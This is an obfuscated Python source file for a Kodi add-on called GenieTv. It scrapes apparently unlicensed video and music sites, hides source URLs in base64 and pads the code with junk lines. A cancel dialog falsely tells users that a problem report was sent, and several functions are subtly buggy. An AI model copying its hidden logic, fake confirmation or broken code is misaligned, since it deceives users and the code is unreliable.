def II111iii ( name , url , iconimage = None ) :
 print '--- Playing "{0}". {1}' . format ( name , url )
 OooO00o000 = xbmcgui . ListItem ( path = url , thumbnailImage = iconimage )
 OooO00o000 . setInfo ( type = "Video" , infoLabels = { "Title" : name } )
 xbmcplugin . setResolvedUrl ( int ( sys . argv [ 1 ] ) , True , OooO00o000 )
 if 36 - 36: Ooo0OO0oOO - OoO0O0 . OoO0O0
 if 60 - 60: i11iIiiIii * Oo % Ooo00oOo00o + Ooo00oOo00o
def ooo000o ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( iIIiiI1II1i11 )
 for url , o0O0o0 , OO in o0o :
  ooOO00oOOo000 ( '[COLORgreen]' + OO + '[/COLOR]' , url , 1006 , o0O0o0 )
def OOOOOO ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0OOOOoO = url
 o0o = re . compile ( "<a href='(.+?)'>(.+?)</a>" ) . findall ( iIIiiI1II1i11 )
 for url , OO in o0o :
  if '.mp3' in OO :
   print '<<<<<<<<<<<<<<<<<<<' + url + '>>>>>>>>>>>>>>>>>>>>>>>>>>>'
   oOO0OO0OO ( ( OO ) . replace ( '.mp3' , '' ) . replace ( '/' , '' ) , 'http://hypem.com' + url , 222 , ii11iIi1I + 'music.png' )
  else :
   ooOO00oOOo000 ( ( OO ) . replace ( '/' , '' ) , o0OOOOoO + url , 1011 , ii11iIi1I + 'music.png' )
def oOO0O ( ) :
 iIIiiI1II1i11 = o0o0 ( i1111 ( 'aHR0cDovL3d3dy5jeW4ubmV0L211c2ljLw==' ) )
 o0o = re . compile ( '<td><a href="(.+?)"><img src="(.+?)"><br>(.+?)</a></td>' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , o0O0o0 , OO in o0o :
  ooOO00oOOo000 ( OO , ( 'http://www.cyn.net/music/' + iI1i11 ) . replace ( ' ' , '%20' ) , 1031 , ( 'http://www.cyn.net/music/' + o0O0o0 ) . replace ( ' ' , '%20' ) )
def oooo0 ( url , img ) :
 iIIiiI1II1i11 = o0o0 ( url )
 Ooo0OOoOoO0 = url
 img = img
 o0o = re . compile ( '<a href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for url , OO in o0o :
  oOO0OO0OO ( ( OO ) . replace ( '.mp3' , '' ) , ( Ooo0OOoOoO0 + '/' + url ) . replace ( ' ' , '%20' ) , 222 , img )
  if 74 - 74: OOooOOo / OoIii111II - OoOoOO00 . OoOoOO00 . OoO0O0 + OoOoOO00
  if 92 - 92: O0o0Ooo % iIii1I11I1II1 - oo0OO / i11iIiiIii % o0Oo0O0Oo00oO * OOooOOo
def ooo0O0O0oo0 ( ) :
 o0OO0oooo = ( i1111 ( 'aHR0cDovL2h5cGVtLmNvbS9kb3dubG9hZC8=' ) )
 IIi1I1iiiii = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 O0O0ooOOO = IIi1I1iiiii . lower ( )
 iI1i11 = ( i1111 ( 'aHR0cDovL3Bhbmljc3RyZWFtLm5ldC9zdHJlYW1zLw==' ) )
 Ooo0OOoOoO0 = ( i1111 ( 'aHR0cDovL21hc2xvdmQubm8taXAub3JnL3B1YmxpYy9tcDMv' ) )
 IIo0Oo0oO0oOO00 = ( i1111 ( 'aHR0cDovL3d3dy5jeW4ubmV0L211c2ljLw==' ) )
 if 85 - 85: OoOoOO00 + o0Oo0O0Oo00oO * Ooo0OO0oOO
 OoOO = o0O0Ooo ( iI1i11 )
 iiIi11iI1iii = o0O0Ooo ( Ooo0OOoOoO0 )
 i1Ii1i1 = o0O0Ooo ( IIo0Oo0oO0oOO00 )
 if 12 - 12: ii11i1 . OOOo0 % OOooOOo
 if OoOO != 'Failed' :
  o0o = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( OoOO )
  for OO in o0o :
   if IIi1I1iiiii in OO . lower ( ) :
    ooOO00oOOo000 ( ( OO + ' source 1' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( iI1i11 + OO ) . replace ( ' ' , '%20' ) , 1006 , '' )
    if 28 - 28: ii11i1 - OOOo0 % Ooo00oOo00o * O0o0Ooo
    Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
 if iiIi11iI1iii != 'Failed' :
  oo000 = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( OoOO )
  for OO in oo000 :
   if IIi1I1iiiii in OO . lower ( ) :
    ooOO00oOOo000 ( ( OO + ' source 2' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( Ooo0OOoOoO0 + OO ) . replace ( ' ' , '%20' ) , 1006 , '' )
    if 80 - 80: iii11 * OoO0O0
    Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
 if i1Ii1i1 != 'Failed' :
  Ooo0oO0 = re . compile ( '<td><a href=".+?"><img src=".+?"><br>(.+?)</a></td>' , re . DOTALL ) . findall ( i1Ii1i1 )
  for OO in Ooo0oO0 :
   if IIi1I1iiiii in OO . lower ( ) :
    ooOO00oOOo000 ( ( OO + ' source 3' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( IIo0Oo0oO0oOO00 + OO ) . replace ( ' ' , '%20' ) , 1031 , '' )
    if 4 - 4: iIii1I11I1II1 . O0o0Ooo + OoOoOO00 % OoooooooOO
    Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
    if 82 - 82: OoooooooOO / o0Oo0O0Oo00oO * Ooo0OO0oOO * O0 . ii11ii1ii
    if 21 - 21: OoOoOO00 + Oo
    if 59 - 59: iii11 + OOOo0 / OoOoOO00 / I1IiI
    if 80 - 80: I1IiI + iIii1I11I1II1 . OoO0O0
    if 76 - 76: OOOo0 * iii11
    if 12 - 12: iIii1I11I1II1 / Ooo0OO0oOO % ii11i1
def IIiiI11 ( ) :
 iIIiiI1II1i11 = ooOOO0 ( 'http://www.iwatchseries.me/tv-list/' )
 o0o = re . compile ( '<h5><a href="([^"]*)"><strong>(.+?)</strong></a></h5>' ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , OO in o0o :
  ooOO00oOOo000 ( OO , iI1i11 , 8021 , ii11iIi1I + 'iwatch.png' )
def IiIIIoO0oOOooO0 ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( '<h5><strong><a href="([^"]*)">(.+?)</a>(.+?)</strong></h5>' ) . findall ( iIIiiI1II1i11 )
 for url , OO , Ooo00OoOOO in o0o :
  ooOO00oOOo000 ( OO + Ooo00OoOOO , url , 8022 , ii11iIi1I + 'iwatch.png' )
def oo00o000O ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( '<iframe src="([^"]*)"' ) . findall ( iIIiiI1II1i11 )
 for url in o0o :
  print '>>>>>>>>>>>>>>>>>>>>' + url
  OooO0o ( url )
def OooO0o ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( '{.+?"file" : "(.+?)",.+?"default" : true.+?"label" : "(.+?)"' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 oo000 = re . compile ( 'setup\(\{.+?file: "(.+?)",.+?skin' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 Ooo0oO0 = re . compile ( "{ label: '([^']*)', file:.+?'([^']*)' }" ) . findall ( iIIiiI1II1i11 )
 for url , OO in o0o :
  oOO0OO0OO ( 'VidSpot - ' + OO , url , 222 , ii11iIi1I + 'iwatch.png' )
 for url in oo000 :
  oOO0OO0OO ( 'VodLocker' , url , 222 , ii11iIi1I + 'iwatch.png' )
 for OO , url in Ooo0oO0 :
  print '<><><><><><><><><><><> before   ' + url
  if 'hevideo' in url :
   print '>>>>>>>>>>>>>>>>>>>>>>>>>' + url
   oOO0OO0OO ( 'TheVideo - ' + OO , url , 222 , ii11iIi1I + 'iwatch.png' )
   if 81 - 81: i1IIi / O0o0Ooo % i11iIiiIii . iIii1I11I1II1 * I1IiI + OoooooooOO
def iiii1Ii1iii ( ) :
 iIIiiI1II1i11 = cloudflare . source ( 'http://www.animeland.me/anime-list' )
 o0o = re . compile ( 'letter-spacing:-1px;" href="([^"]*)">(.+?)</a></li>' ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , OO in o0o :
  ooOO00oOOo000 ( OO , iI1i11 , 1021 , ii11iIi1I + 'anime.png' )
  if 73 - 73: i11iIiiIii + OoIii111II % Ooo0OO0oOO . OoooooooOO % OoIii111II
  if 32 - 32: i11iIiiIii - OoOoOO00
def iIii1II1I ( ) :
 iIIiiI1II1i11 = ooOOO0 ( 'http://www.animetoon.org/cartoon' )
 o0o = re . compile ( '<td><a href="(.+?)">(.+)</a></td>' ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , OO in o0o :
  ooOO00oOOo000 ( OO , iI1i11 , 1002 , ii11iIi1I + 'anime.png' )
  if 25 - 25: I1IiI
  if 40 - 40: iIii1I11I1II1 - o0Oo0O0Oo00oO / Oo
  if 24 - 24: OoIii111II - oo0OO / o0Oo0O0Oo00oO
def iIiiII1Ii1ii ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 oo000 = re . compile ( '<img src="(.+?)" id="series_image" width="250" height="370" alt=".+?" />' ) . findall ( iIIiiI1II1i11 )
 for o0O0o0 in oo000 :
  IIiIii1 = o0O0o0
 Ooo0oO0 = re . compile ( '<li><a href="(.+?)">Next</a></li>' ) . findall ( iIIiiI1II1i11 )
 for url in Ooo0oO0 :
  ooOO00oOOo000 ( 'NEXT PAGE' , url , 1002 , ii11iIi1I + 'Next.png' )
 o0o = re . compile ( '&nbsp;<a href="(.+?)">(.+?)</a>' ) . findall ( iIIiiI1II1i11 )
 for url , OO in o0o :
  ooOO00oOOo000 ( OO , url , 1003 , IIiIii1 )
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
def iIIi1 ( url , IMAGE ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( '"playlist">(.+?)</span></div><div><iframe src="(.+?)"' ) . findall ( iIIiiI1II1i11 )
 for OO , url in o0o :
  print OO + '     ' + url
  if 'easy' in url :
   OoOo0O00 ( url )
  elif 'playpanda' in url :
   OoOo0O00 ( url )
   if 9 - 9: iii11
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
def OoOo0O00 ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( "url: '(.+?)'," ) . findall ( iIIiiI1II1i11 )
 for url in o0o :
  oOO0OO0OO ( 'STREAM' , url , 222 , ii11iIi1I + 'anime.png' )
  if 38 - 38: Ooo0OO0oOO . Ooo00oOo00o . i11iIiiIii * OoooooooOO + oo0OO
  if 49 - 49: Oo - Ooo00oOo00o / O0o0Ooo / OOooOOo % OoIii111II
def IIiOoO0000o ( url ) :
 O0o = urllib2 . Request ( url )
 O0o . add_header ( 'User-Agent' , "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" )
 O0o . add_header ( 'referer' , url )
 O00oOOooO = urllib2 . urlopen ( O0o )
 oOooo0O0o = O00oOOooO . read ( )
 O00oOOooO . close ( )
 return oOooo0O0o
 if 53 - 53: Ooo00oOo00o . O0 . OOOo0 * iii11 / OOooOOo
def o0o0 ( url ) :
 O0o = urllib2 . Request ( url )
 O0o . add_header ( 'User-Agent' , "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" )
 O00oOOooO = urllib2 . urlopen ( O0o )
 oOooo0O0o = O00oOOooO . read ( )
 O00oOOooO . close ( )
 return oOooo0O0o
 if 34 - 34: I1IiI
def iiI1i11I ( url ) :
 xbmcplugin . addSortMethod ( handle = int ( sys . argv [ 1 ] ) , sortMethod = xbmcplugin . SORT_METHOD_TITLE )
 ooOO0o = ( '%s%s' % ( oO0O0oO0 , url ) )
 oOooo0O0o = o0o0 ( url )
 o0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( oOooo0O0o )
 for url , iiI1IIIi , OO in o0o :
  oOO0OO0OO ( '%s' % ( OO ) . replace ( 'GenieTv' , '[COLOR green]GenieTV[/COLOR]' ) . replace ( '.' , ' ' ) . replace ( 'mp4' , '' ) . replace ( 'mkv' , '' ) . replace ( '_' , ' ' ) , '%s' % ( url ) , 222 , iiI1IIIi )
  if 31 - 31: OoOoOO00 + iii11 - OoooooooOO . Ooo0OO0oOO
def oOo0OOoO0 ( url ) :
 oo0 = xbmc . Player ( oOOO0oOoo ( ) )
 import urlresolver
 try : oo0 . play ( url )
 except : pass
 from urlresolver import common
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( 'LOADING' , 'Opening %s Now' % ( OO ) )
 oo0 = xbmc . Player ( oOOO0oOoo ( ) )
 url = urlresolver . HostedMediaFile ( url ) . resolve ( )
 if Oo0oO0ooo . iscanceled ( ) :
  print "[COLORred]STREAM CANCELLED[/COLOR]"
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  if i1iiIIiiI111 . yesno ( "[B]CANCELLED[/B]" , '[B]Was There A Problem[/B]' , '' , "" , 'Yes' , 'No' ) :
   i1iiIIiiI111 . ok ( "Message Send" , "Your Message Has Been Sent" )
  else :
   return
 else :
  try : oo0 . play ( url )
  except : pass
  try : o0oO0 . resolve_url ( url )
  except : pass
  Oo0oO0ooo . close ( )
  if 28 - 28: ii11i1 . ii11ii1ii
def oOo000Oo00o ( url ) :
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( 'Featching Your Video' , 'Featching Your Video' )
 Oo0oO0ooo . update ( 0 , '%s' % OO )
 xbmc . sleep ( 1 )
 oo0 = xbmc . Player ( oOOO0oOoo ( ) )
 Oo0oO0ooo . update ( 100 , '%s' % OO )
 xbmc . sleep ( 1 )
 oo0 . play ( url ) . strip ( )
 Oo0oO0ooo . close ( )
 if 81 - 81: OoooooooOO
def Ooo0 ( url ) :
 oo0 = xbmc . Player ( oOOO0oOoo ( ) )
 import urlresolver
 url = ( url ) . strip ( )
 try : oo0 . play ( url ) . strip ( )
 except : pass
 if 88 - 88: O0 * OOooOOo
 if 44 - 44: OOooOOo / ii11ii1ii . Oo + I1IiI
def oOOO0oOoo ( ) :
 try :
  I1111111 = getSet ( "core-player" )
  if ( I1111111 == 'DVDPLAYER' ) : o0OOOoOO00o = xbmc . PLAYER_CORE_DVDPLAYER
  elif ( I1111111 == 'MPLAYER' ) : o0OOOoOO00o = xbmc . PLAYER_CORE_MPLAYER
  elif ( I1111111 == 'PAPLAYER' ) : o0OOOoOO00o = xbmc . PLAYER_CORE_PAPLAYER
  else : o0OOOoOO00o = xbmc . PLAYER_CORE_AUTO
 except : o0OOOoOO00o = xbmc . PLAYER_CORE_AUTO
 return o0OOOoOO00o
 return True
 if 56 - 56: Oo * Ooo0OO0oOO / Ooo00oOo00o . i11iIiiIii - O0 / Oo
def ooOO00oOOo000 ( name , url , mode , iconimage , showcontext = True , allinfo = { } ) :
 o00OoO0oO00 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name )
 iIi = True
 iiO0O0o0oO0O00 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 iiO0O0o0oO0O00 . setInfo ( type = "Video" , infoLabels = { "Title" : name } )
 if showcontext :
  IiiIi1iI1 = [ ]
  if showcontext == 'fav' :
   IiiIi1iI1 . append ( ( 'Remove from Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10056&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
  if not name in OOO00 :
   IiiIi1iI1 . append ( ( 'Add to Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10055&name=%s&url=%s&iconimage=%s&fav_mode=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) , urllib . quote_plus ( url ) , urllib . quote_plus ( iconimage ) , mode ) ) )
  iiO0O0o0oO0O00 . addContextMenuItems ( IiiIi1iI1 )
 iIi = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o00OoO0oO00 , listitem = iiO0O0o0oO0O00 , isFolder = True )
 return iIi
 if 83 - 83: o0Oo0O0Oo00oO * I1IiI - OoO0O0 + oo0OO % i11iIiiIii . OoO0O0
def iIi1IiI ( name , url , mode , iconimage , fanart , description ) :
 if 16 - 16: iIii1I11I1II1 * oo0OO + OoIii111II . O0 . OOooOOo
 o00OoO0oO00 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 iIi = True
 iiO0O0o0oO0O00 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 iiO0O0o0oO0O00 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 iiO0O0o0oO0O00 . setProperty ( "Fanart_Image" , fanart )
 iIi = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o00OoO0oO00 , listitem = iiO0O0o0oO0O00 , isFolder = True )
 return iIi
 if 99 - 99: i11iIiiIii - oo0OO
def oOO0OO0OO ( name , url , mode , iconimage , showcontext = True , allinfo = { } ) :
 o00OoO0oO00 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name )
 iIi = True
 iiO0O0o0oO0O00 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 iiO0O0o0oO0O00 . setInfo ( type = "Video" , infoLabels = { "Title" : name } )
 if showcontext :
  IiiIi1iI1 = [ ]
  if showcontext == 'fav' :
   IiiIi1iI1 . append ( ( 'Remove from Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10056&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
  if not name in OOO00 :
   IiiIi1iI1 . append ( ( 'Add to Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10055&name=%s&url=%s&iconimage=%s&fav_mode=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) , urllib . quote_plus ( url ) , urllib . quote_plus ( iconimage ) , mode ) ) )
  iiO0O0o0oO0O00 . addContextMenuItems ( IiiIi1iI1 )
 iIi = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o00OoO0oO00 , listitem = iiO0O0o0oO0O00 , isFolder = False )
 return iIi
 if 85 - 85: O0o0Ooo % ii11ii1ii
 if 95 - 95: Ooo00oOo00o * iii11 * oo0OO . OOooOOo
 if 73 - 73: Ooo00oOo00o
 if 28 - 28: OoooooooOO - Ooo0OO0oOO
 if 84 - 84: OoOoOO00
 if 36 - 36: iii11 - I1IiI - iIii1I11I1II1
def iIIi1i1 ( heading , announce ) :
 class II11 ( ) :
  WINDOW = 10147
  CONTROL_LABEL = 1
  CONTROL_TEXTBOX = 5
  def __init__ ( self , * args , ** kwargs ) :
   xbmc . executebuiltin ( "ActivateWindow(%d)" % ( self . WINDOW , ) )
   self . win = xbmcgui . Window ( self . WINDOW )
   xbmc . sleep ( 500 )
   self . setControls ( )
  def setControls ( self ) :
   self . win . getControl ( self . CONTROL_LABEL ) . setLabel ( heading )
   try : Ii1II1I11i1 = open ( announce ) ; oo0o0O = Ii1II1I11i1 . read ( )
   except : oo0o0O = announce
   self . win . getControl ( self . CONTROL_TEXTBOX ) . setText ( str ( oo0o0O ) )
   return
 II11 ( )
 II11 ( )
 if 91 - 91: iIii1I11I1II1 % O0
def oooIi1i ( ) :
 iIIi1i1 ( 'These are the main Sources you should get into you XBMC' , '[COLORwhite]http://architects.x10host.com[/COLOR]--- [CR]  [COLORred]http://repo.sharktech.co.uk[/COLOR]--- [CR]   [COLORwhite]http://fusion.tvaddons.ag[/COLOR]--- [CR]  [COLORred]http://i.totalxbmc.tv[/COLOR]--- [CR]   [COLORwhite]http://www.xunitytalk.com/xfinity[/COLOR]--- [CR]  [COLORred]http://srp.nu[/COLOR]--- [CR]   [COLORwhite]http://solved.no-issue.ca[/COLOR]--- [CR]  [COLORred]http://xbmc.aminhacasadigital.com[/COLOR]--- [CR]   [COLORwhite]http://xbmc.movieshd.co[/COLOR]--- [CR]  [COLORred]http://install.kaosbox.tv[/COLOR]--- [CR]   [COLORwhite]http://kodi-repo.com/mxr[/COLOR]--- [CR]  [COLORred]http://kodi.metalkettle.co[/COLOR]--- [CR]   [COLORwhite]http://prozone.getxbmc.com[/COLOR]--- [CR]  [COLORred]http://transform.mega-tron.tv[/COLOR]--- [CR]   [COLORwhite]http://muckys.kodimediaportal.ml[/COLOR]--- [CR]  [COLORred]http://jas0npc.pcriot.com[/COLOR]--- [CR]  [COLORwhite]Sports devil source[/COLOR]--- [CR]  [COLORred]http://iwillfolo.com/iwf[/COLOR]' )
 if 49 - 49: OoIii111II + OoIii111II + i11iIiiIii % oo0OO
 if 39 - 39: Ooo0OO0oOO / oo0OO + i1IIi % iii11
 if 51 - 51: O0 % OoOoOO00 % i11iIiiIii + iii11 . OoooooooOO
 if 14 - 14: Oo + i11iIiiIii - OoIii111II % OoO0O0
 if 1 - 1: OoIii111II + O0o0Ooo . OOOo0
def iI111i ( ) :
 xbmc . executebuiltin ( 'UpdateLocalAddons' )
 xbmc . executebuiltin ( 'UpdateAddonRepos' )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , '' , '                                 REFRESH SUCCESSFUL :)' , "                          [COLOR gold]Brought To You By Kodi Support Group, GenieTv[/COLOR]" )
 return
 if 47 - 47: oo0OO . I1IiI
 if 58 - 58: oo0OO + Oo / OOOo0
 if 68 - 68: OoO0O0 * ii11i1
 if 91 - 91: ii11i1 + Ooo00oOo00o * OOooOOo . O0o0Ooo
 if 89 - 89: OoooooooOO * ii11i1 * OOOo0 . o0Oo0O0Oo00oO * ii11i1 / oo0OO
 if 46 - 46: i11iIiiIii
 if 15 - 15: O0 / i1IIi / i1IIi . oo0OO % I1IiI + OOOo0
 if 48 - 48: O0o0Ooo % oo0OO % ii11i1 % iIii1I11I1II1 . ii11i1
 if 14 - 14: oo0OO * Ooo00oOo00o % O0 + Ooo0OO0oOO + ii11ii1ii
 if 23 - 23: Oo % oo0OO + ii11i1 - O0o0Ooo
 if 65 - 65: OoooooooOO
 if 22 - 22: iii11 + OoOoOO00 + Oo
 if 83 - 83: o0Oo0O0Oo00oO
 if 43 - 43: iii11
 if 84 - 84: iii11 . OoO0O0 . oo0OO
 if 2 - 2: Oo - I1IiI
 if 49 - 49: ii11i1 + OoOoOO00 / OoIii111II - I1IiI % I1IiI + OOOo0
 if 54 - 54: o0Oo0O0Oo00oO % Oo - iii11
 if 16 - 16: ii11ii1ii * oo0OO / Ooo0OO0oOO
 if 46 - 46: OoOoOO00
 if 13 - 13: OoO0O0 + OoOoOO00 % OOOo0
 if 30 - 30: OoooooooOO - i11iIiiIii + OoIii111II / Oo - i11iIiiIii
 if 74 - 74: O0 . Ooo0OO0oOO
 if 64 - 64: o0Oo0O0Oo00oO / i1IIi % oo0OO
def OOoOo0O0 ( url ) :
 oOooo0O0o = ooOOO0 ( iiI1IiI + I1o0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 42 , IIii1111 , I1iI , iI1i111I1Ii )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 26 - 26: oo0OO * iIii1I11I1II1 + OoOoOO00 / OOOo0
def O0OO ( url ) :
 oOooo0O0o = ooOOO0 ( iiI1IiI + o0o0O00oOo ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 42 , IIii1111 , I1iI , iI1i111I1Ii )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 42 - 42: OoOoOO00
def Ooooo ( url ) :
 oOooo0O0o = ooOOO0 ( iiI1IiI + IIIiI1iIIII ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 42 , IIii1111 , I1iI , iI1i111I1Ii )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 75 - 75: iii11 % OoOoOO00
def IIIIi1Iii1iIi ( url ) :
 oOooo0O0o = ooOOO0 ( iiI1IiI + ii1IIi1iI1ii1 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 42 , IIii1111 , I1iI , iI1i111I1Ii )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 58 - 58: ii11i1 . Ooo0OO0oOO
def iIIiIi111iI ( url ) :
 oOooo0O0o = ooOOO0 ( iiI1IiI + II1I1ii ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 42 , IIii1111 , I1iI , iI1i111I1Ii )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 54 - 54: OoooooooOO + Oo * iii11
def oOoO0O00o ( url ) :
 oOooo0O0o = ooOOO0 ( iiI1IiI + IiI11II ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 42 , IIii1111 , I1iI , iI1i111I1Ii )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 87 - 87: Oo . OoooooooOO * O0o0Ooo * OoOoOO00 / i1IIi * I1IiI
def I11IiIi1iI1ii ( url ) :
 oOooo0O0o = ooOOO0 ( iiI1IiI + O0oOo0o0OOoO0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 42 , IIii1111 , I1iI , iI1i111I1Ii )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 30 - 30: ii11i1 % Ooo0OO0oOO + OOooOOo
def oooOoO ( url ) :
 oOooo0O0o = ooOOO0 ( iiI1IiI + IiiIi1IiiiI ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 42 , IIii1111 , I1iI , iI1i111I1Ii )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 79 - 79: ii11ii1ii - iIii1I11I1II1 % i1IIi / Oo + OoOoOO00
def oOOo00ooO ( url ) :
 oOooo0O0o = ooOOO0 ( iiI1IiI + ooOo ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 42 , IIii1111 , I1iI , iI1i111I1Ii )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 73 - 73: Ooo00oOo00o * OoooooooOO - OoooooooOO + OOOo0 * Oo
def oOo0 ( url ) :
 oOooo0O0o = ooOOO0 ( iiI1IiI + Iiii11 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 5 , IIii1111 , I1iI , iI1i111I1Ii )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
